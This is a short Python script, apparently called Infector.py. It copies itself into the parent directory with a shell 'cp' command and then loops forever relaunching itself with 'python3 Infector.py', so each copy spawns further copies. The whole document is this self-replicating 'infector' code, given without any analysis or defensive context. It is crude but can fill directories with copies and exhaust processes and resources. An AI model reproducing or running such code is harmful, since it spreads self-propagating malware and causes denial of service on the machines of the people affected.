import os
import subprocess

running = True
home_dir = os.getcwd()

os.chdir("..")
target_dir = os.getcwd()

os.chdir(home_dir)

command = 'cp Infector.py ' + str(target_dir)

while running:
    subprocess.run(command, shell = True)
    command = 'python3 Infector.py'


